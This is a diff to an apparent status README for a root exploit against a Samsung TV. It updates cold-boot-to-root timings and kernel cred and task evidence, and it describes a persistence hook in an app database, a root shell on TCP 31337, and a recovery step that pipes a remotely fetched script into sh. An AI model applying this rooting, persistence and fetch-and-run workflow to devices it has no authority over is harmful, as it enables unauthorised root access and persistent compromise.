@@ -35,7 +35,7 @@ channel on TCP 31337 (line protocol, replies end with `__END__`).
 | | |
 |---|---|
 | Payload | **v35 on the TV and in the repo** (`e33d6f6a…`, 29,184 B), deployed 2026-10-25 |
-| Boot-to-root | **Fifth pass closed: attempt 2 is the floor; v34 cold boot 34 s.** v35 is v34 plus the high-alloc gate fix (junk cred words on a high parent page no longer set `sawLow`; the gate beacon logs the raw word), deployed but not cold-booted yet. v34 cold boot (19:40): attempt 1 high, gate t=25, attempt 2 root t=34. A second v34 cold boot on the stock→root cycle (19:59) needed attempt 3 at t=68 s (attempt 2 hunt `seen=0`); the floor is attempt 2, but that variance is real. v33's first cold boot: attempt 1 high, gate t=32, attempt 2 root t=38–39; v32: attempt 1 high, attempt 2 low, root t=59; v31: attempts 1–3 high, attempt 4 t=132 s. Evidence: every coherent task/cred read < `0xE0000000` (78/78 `cuid=5001` creds low; 21/21 high creds junk; 15/15 `direct-parent+` and 19/19 `self-patch` successes low; 0/81 task pointers high). Marker: `share/root_boot.txt` |
+| Boot-to-root | **Fifth pass closed: attempt 2 is the floor; v35 cold boot 37 s.** v35 cold boot (2026-10-25 21:54): attempt 1 parent `e2df7300` high, raw cred `b09aa3b5`, gate at t=26, fast-exit; attempt 2 rooted at t=37. This boot confirms the v35 beacon change (it logged the raw `b09aa3b5` instead of `00000000`). v34 cold boots: 34 s (19:40, attempt 2) and 68 s on the stock→root cycle (19:59, attempt 3; attempt 2 hunt `seen=0`). v33: attempt 1 high, gate t=32, attempt 2 root t=38–39; v32: attempt 1 high, attempt 2 low, root t=59; v31: attempts 1–3 high, attempt 4 t=132 s. Evidence: every coherent task/cred read < `0xE0000000` (78/78 `cuid=5001` creds low; 21/21 high creds junk; 15/15 `direct-parent+` and 19/19 `self-patch` successes low; 0/81 task pointers high). Marker: `share/root_boot.txt` |
 | Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
 | Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
 | Device | `/dev/video40`, one RDWR opener; the app runs as uid 5001, gid 44 |
@@ -394,7 +394,7 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
 - [ ] `root_shell.py "id" <TV_IP>` returns `uid=0(root)`.
 - [ ] `root_shell.py "cat /proc/self/status | grep CapEff" <TV_IP>` → `0000003fffffffff`.
 - [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `e33d6f6a…`
-- [ ] Cold boot with the browser closed → attempt 1 high exits in ~2 s (`high-alloc … fast-exit`), attempt 2 roots; v34 cold boots observed **34 s** (attempt 2) and **68 s** (attempt 3, full stock→root cycle; attempt 2 hunt `seen=0`). Attempt-1 `SUCCESS` is a bonus; attempt 2 is the floor, but a slow hunt can push to attempt 3.
+- [ ] Cold boot with the browser closed → attempt 1 high exits in ~2 s (`high-alloc … fast-exit`), attempt 2 roots; v35 cold boot observed **37 s** (attempt 2); v34 saw 34 s and 68 s (the latter attempt 3 on the stock cycle). Attempt-1 `SUCCESS` is a bonus; attempt 2 is the floor, but a slow hunt can push to attempt 3.
 - [ ] `kill -9 <app pid>` → channel back in ~5–45 s (v33's high-alloc gate skips a high attempt quickly; otherwise attempt 2 roots), still uid 0.
 - [ ] `python tools/test_all.py --tv` against a fresh page load (stub protocol
       + clamps). Details per layer: `docs/TESTING.md`.
@@ -629,4 +629,4 @@ rooted set risks the root; the warning to keep auto-update off remains).
   (`curl -s http://<pc>/recover.sh | sh`) to reinstall the payload end-to-end: it
   takes the app's SMACK label via `/proc/self/attr/current`, runs `deploy.sh`, and
   `deploy.sh` restarts the app so the new DLL loads. Verified on
-  a cold boot (v34: 34 s; the stock→root cycle boot took 68 s / attempt 3).
+  a cold boot (v35: 37 s; v34: 34 s, and 68 s on the stock cycle).
